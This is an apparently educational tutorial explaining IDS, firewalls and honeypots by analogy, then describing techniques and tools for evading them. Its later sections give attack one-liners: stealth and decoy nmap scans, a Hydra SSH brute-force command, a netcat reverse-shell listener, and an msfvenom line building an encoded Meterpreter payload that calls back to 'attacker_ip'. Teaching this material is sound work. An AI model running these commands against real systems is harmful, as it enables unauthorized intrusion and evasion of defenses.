IDS (Intrusion Detection System) – The Security Camera

Imagine a security camera in a shop:

It doesn’t stop you from entering.
But it watches and records everything, and can alert the guard if you act suspiciously.

In computers:

An IDS monitors network traffic or system activities.
It compares what it sees against rules or patterns of bad behavior (like a database of known attacks).
If it finds something suspicious, it raises an alert.

Types of IDS (Intrusion Detection System)

1. Network IDS (NIDS)

Imagine a traffic cop standing on the highway.
Watches every car (data packet) passing on the road.
If a suspicious car drives by (like carrying stolen goods), it notes the license plate and alerts the station.
Works on the whole network.

2. Host IDS (HIDS)

Imagine a security guard inside one building.
Checks everyone entering rooms, opening safes, or using computers inside the building.
If someone tampers with something, the guard reports it.
Works on a single computer or server.

Firewall – The Security Gate

Think of a guard at the gate:

Decides who can enter and what can leave.
Blocks certain people (traffic) based on rules.

In computers:

A firewall filters data coming in or going out.
It can block specific IP addresses, ports, protocols, or even types of requests.

Types of Firewalls:

1. Packet Filtering Firewall

Think of a mail sorter at the post office.
Looks at only the envelope (address, sender, type of mail).
If the address isn’t allowed, the mail is thrown away.
Doesn’t open the letter to see what’s inside.

2. Stateful Firewall

Like a party guest list checker who remembers conversations.
If someone came in earlier and is talking to a friend inside, they’re allowed to keep passing notes.
If a stranger suddenly tries to pass a note without being in the party before, they’re stopped.

3. Application Firewall

Like a bouncer who understands the language of the guests.
If the bouncer hears someone whispering dangerous words, even if they’re allowed inside, they get kicked out.
Works for specific apps, like blocking dangerous commands in a web request.

Honeypot – The Fake Treasure

Imagine a fake gold chest placed in a forest:

Real treasure is hidden somewhere else.
Thieves get distracted and waste time on the fake one.
The owner gets notified when someone touches it.

In computers:

A honeypot is a fake system or service designed to lure attackers.
It’s used to study their methods and divert them from real systems.

Evasion Techniques


1. IDS Evasion Techniques

Goal: Make the IDS either not notice you or misunderstand what you’re doing.

a) Fragmentation

Idea: Instead of sending your attack in one big chunk, split it into tiny pieces (packets).
Why it works: Some IDS struggle to reassemble fragmented packets, so they might miss the malicious part.

b) Obfuscation / Encoding

Idea: Hide malicious commands by encoding them (Base64, URL encoding) or by using uncommon character sets.
Why it works: IDS might not decode before checking, so it misses the real intent.

c) Packet Timing (Slow Attacks)

Idea: Spread out the attack over a long time instead of sending it all at once.
Why it works: IDS often look for bursts of suspicious activity; slow attacks may slip under the radar.

d) Protocol Manipulation

Idea: Use uncommon or non-standard protocol features to confuse the IDS.
Example: Using TCP options or strange HTTP headers that the IDS isn’t programmed to check.



2. Firewall Evasion Techniques

Goal: Get your packets through the firewall without being blocked.

a) Port Hopping

Idea: Keep changing the port numbers you send traffic through.
Why it works: Firewalls may block certain ports but not others.

b) Using Allowed Protocols

Idea: Hide your attack inside a protocol the firewall allows (like HTTP or DNS).
Why it works: Firewalls can’t block essential protocols without breaking normal traffic.

c) Spoofing Source Addresses

Idea: Pretend your traffic is coming from a trusted IP.
Why it works: If the firewall allows that IP, your traffic passes through.


3. Honeypot Evasion Techniques

Goal: Avoid interacting with fake systems meant to lure attackers.

a) System Fingerprinting

Idea: Check system behavior to see if it’s real (response times, services running).
Why it works: Honeypots often have unusual or incomplete configurations.

b) Avoiding High-Interaction Targets

Idea: Stick to your known targets; don’t explore suspicious open services.
Why it works: Honeypots usually advertise tempting but fake services.

IDS, Firewall & Honeypot Evasion Tools


1. Nmap (Stealth Scanning & Firewall Evasion)

What it is: Network mapper used for scanning hosts, services, and firewall rules.

How it helps evasion:
Can fragment packets, spoof source IPs, and use decoys to confuse IDS.
Can slow down scans to avoid triggering alerts.

Example uses:

Fragment packets:
                 nmap -f target.com
                Breaks packets into smaller pieces to bypass detection.

Use decoys:
           nmap -D RND:10 target.com
           Sends scans from multiple fake IPs.

Slow scan:
          nmap --scan-delay 5s target.com


2. Hping3 (Custom Packet Crafting)

What it is: A packet generator and analyzer.

How it helps evasion:
You can create packets with custom flags, sizes, and timings to bypass IDS/Firewall rules.

Example uses:
             TCP SYN scan on port 80:
                                     hping3 -S -p 80 target.com


                    Fragment packets:
                                     hping3 -f -p 80 target.com


3. Scapy (Python Packet Crafting)

What it is: A Python-based interactive packet manipulation tool.

How it helps evasion:
Create highly customized packets that mimic normal traffic but carry malicious payloads.

Example:

from scapy.all import *
packet = IP(dst="target.com")/TCP(dport=80, flags="S")
send(packet)


4. Netcat (Backdoor & Tunneling)

What it is: Networking utility for reading/writing data over TCP/UDP.

How it helps evasion:
Can create reverse shells over allowed ports (e.g., port 443) to bypass firewalls.

Example uses:

Listen on port 4444:
                  nc -lvp 4444
Connect to remote shell:
                  nc target.com 4444


5. Proxychains (Routing Traffic via Multiple Proxies)

What it is: Routes your traffic through SOCKS/HTTP proxies.

How it helps evasion:
            Masks attacker IP, hides scanning activity.

Example:
           proxychains nmap -sT target.com


6. THC Hydra (Password Guessing with IDS Evasion)

What it is: Fast network logon cracker.

How it helps evasion:
Supports slow brute force and proxy routing to avoid triggering IDS.

Example:
         hydra -l admin -P passwords.txt target.com ssh


7. Metasploit (Payload Obfuscation)

What it is: Exploitation framework.

How it helps evasion:
Can encode payloads to bypass IDS/AV.

Example:
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -f exe > shell.exe


8. Snort / Suricata (Testing Evasion)

What it is: IDS systems themselves.

Why attackers use them:
They set up IDS locally to test if their crafted traffic will trigger detection.

Example:
         snort -A console -q -c /etc/snort/snort.conf -i eth0
